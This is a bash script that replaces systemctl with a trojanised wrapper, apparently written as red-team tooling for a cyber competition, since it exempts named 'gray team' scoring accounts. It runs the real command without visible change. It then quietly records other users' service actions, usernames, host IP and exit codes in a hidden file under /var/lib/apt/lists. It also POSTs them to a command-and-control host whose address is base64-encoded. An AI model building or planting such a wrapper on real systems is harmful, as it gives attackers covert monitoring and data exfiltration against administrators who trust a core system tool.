#!/bin/bash
REAL_SYSTEMCTL="/usr/bin/systemctl"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SYSTEMCTL "$@" ;;
esac


LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")

INTERESTING="start|stop|restart|reload|enable|disable|mask|unmask|kill"

ACTION=""
UNITS=""
for arg in "$@"; do
    case "$arg" in
        --*) ;;
        -*)  ;;
        *)
            if [ -z "$ACTION" ]; then
                ACTION="$arg"
            else
                UNITS="${UNITS} ${arg}"
            fi
            ;;
    esac
done
UNITS="${UNITS# }"

$REAL_SYSTEMCTL "$@"
RC=$?

if echo "$ACTION" | grep -qE "^(${INTERESTING})$"; then
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"systemctl","timestamp":"%s","data":{"action":"%s","units":"%s","exit_code":%d}}' \
        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$ACTION" "$UNITS" "$RC")
    _log_remote "$PAYLOAD"
    _log_local "${HOST_TS}|systemctl|${INVOKING_USER}|${ACTION}|${UNITS}|rc:${RC}"
fi

exit $RC
